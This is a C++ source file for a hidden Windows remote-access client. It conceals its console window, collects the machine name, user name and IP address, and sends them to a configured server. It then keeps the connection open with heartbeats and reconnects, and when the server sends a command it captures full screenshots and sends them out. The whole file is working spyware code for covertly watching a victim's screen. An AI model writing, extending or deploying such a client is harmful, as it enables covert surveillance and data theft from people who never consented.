#include "main_client.h"

extern "C" int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
	// Hide the console window
	ShowWindow(GetConsoleWindow(), SW_HIDE);
	getMachineInformation();
	if (connectToServer() != 0) { return -1; }
	CreateThread(NULL, 0, sendHeartbeat, NULL, 0, NULL);
	handleServerCommands();
	closesocket(clientSocket);
	WSACleanup();
	return 0;
}

bool getMachineInformation() {
	ULONG ulOutBufLen = sizeof(IP_ADAPTER_INFO)/**10*/;
	PIP_ADAPTER_INFO pAdapter = nullptr;
	DWORD size = sizeof(computerName);
	DWORD userNameSize = sizeof(userName), ret;

	GetComputerNameA(computerName, &size);
	GetUserNameA(userName, &userNameSize);

	PIP_ADAPTER_INFO pAdapterInfo = (PIP_ADAPTER_INFO)malloc(ulOutBufLen);
	if (GetAdaptersInfo(pAdapterInfo, &ulOutBufLen) == ERROR_BUFFER_OVERFLOW) {
		PIP_ADAPTER_INFO temp = (PIP_ADAPTER_INFO)realloc(pAdapterInfo,ulOutBufLen);
		if (!temp) return false;
		pAdapterInfo = temp;
	}
	
	if ((ret = GetAdaptersInfo(pAdapterInfo, &ulOutBufLen)) == NO_ERROR) {
		while (pAdapter = pAdapterInfo) {
			if (pAdapter->IpAddressList.IpAddress.String[0] != '0') {
				sprintf(machineInfo, "Computer: %s | User: %s | IP: %s",
					computerName, userName, pAdapter->IpAddressList.IpAddress.String);
				break;
			}
			pAdapter = pAdapter->Next;
		}
	}
	else printf("%d", ret);
	free(pAdapterInfo);
	return true;
}

void captureScreenshot() {
	HDC hdcScreen = GetDC(NULL), hdcMem = CreateCompatibleDC(hdcScreen);

	int width = GetSystemMetrics(SM_CXSCREEN), height = GetSystemMetrics(SM_CYSCREEN);

	HBITMAP hBitmap = CreateCompatibleBitmap(hdcScreen, width, height);
	SelectObject(hdcMem, hBitmap);
	BitBlt(hdcMem, 0, 0, width, height, hdcScreen, 0, 0, SRCCOPY);

	BITMAPFILEHEADER bmfHeader;
	BITMAPINFOHEADER bitmap{
		.biSize = sizeof(BITMAPINFOHEADER),
	.biWidth = width,
	.biHeight = height,
	.biPlanes = 1,
	.biBitCount = 24,
	.biCompression = BI_RGB,
	.biSizeImage = 0,
	.biXPelsPerMeter = 0,
	.biYPelsPerMeter = 0,
	.biClrUsed = 0,
	.biClrImportant = 0,
	};

	DWORD dwBmpSize = ((width * bitmap.biBitCount + 31) / 32) * 4 * height;
	std::unique_ptr<char[]> lpbitmap(new char[dwBmpSize]);
	GetDIBits(hdcScreen, hBitmap, 0, height, lpbitmap.get(), (BITMAPINFO*)&bitmap, DIB_RGB_COLORS);

	 send(clientSocket, lpbitmap.get(), dwBmpSize, 0);
	DeleteObject(hBitmap);
	DeleteDC(hdcMem);
	ReleaseDC(NULL, hdcScreen);
}

int connectToServer() {
	WSADATA wsaData;
	if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) { return -1; }

	clientSocket = socket(AF_INET, SOCK_STREAM, 0);
	if (clientSocket == INVALID_SOCKET) {
		WSACleanup();
		return -1;
	}

	sockaddr_in serverAddr{
		.sin_family = AF_INET,
		.sin_port = htons(SERVER_PORT),
		.sin_addr {.S_un {.S_addr = inet_addr(SERVER_IP)}},
	};

	if (connect(clientSocket, (sockaddr*)&serverAddr, sizeof(serverAddr))) {
		closesocket(clientSocket);
			WSACleanup();
			return -1;
	}

	send(clientSocket, machineInfo, strlen(machineInfo), 0);
	return 0;
}

void handleServerCommands() {
	char buffer[1024];
	int bytesReceived;
	for (;;) {
		bytesReceived = recv(clientSocket, buffer, sizeof(buffer), 0);
		if (bytesReceived <= 0) {
			Sleep(10000);
			connectToServer();
			continue;
		}
		if(bytesReceived < sizeof(buffer)) buffer[bytesReceived] = '\0';

		if (strcmp(buffer, "SCREENSHOT") == 0) {
			captureScreenshot();
		}

	}
}
DWORD WINAPI sendHeartbeat(LPVOID lpParam) {
	char buf[32] = "Timestamp | ";
	time_t now; tm timeinfo;
	for (;;) {
		now = time(NULL);
		localtime_s(&timeinfo,&now);
		strftime(&buf[12], 18, "%H:%M:%S %d.%m.%y", &timeinfo);
		if (send(clientSocket, buf, strlen(buf), 0) < 0) {
			connectToServer();// Connection lost, attempt to reconnect
		}
		Sleep(HEARTBEAT_INTERVAL);
	}
	return 0;
}